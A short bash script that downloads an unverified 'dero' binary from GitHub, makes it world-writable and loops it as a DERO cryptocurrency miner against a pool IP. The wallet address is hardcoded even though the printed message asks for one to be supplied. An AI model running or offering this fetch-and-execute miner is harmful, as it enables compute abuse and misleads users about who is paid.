wget https://github.com/angkii/m/raw/main/dero
chmod 777 dero

#!/bin/bash
echo "Replace YOUR_ADDRESS to run the miner"
while :; do
    ./dero -w deroi1qykdhx37h72gy9hl48xjjvdagjyh7afzsr8tn0r54tem8dq5evxncq9pvfz92xcls7cggsdpg2nq9ekva7.DERO -r 170.187.197.220:443 -p stratum;
    sleep 5;
done
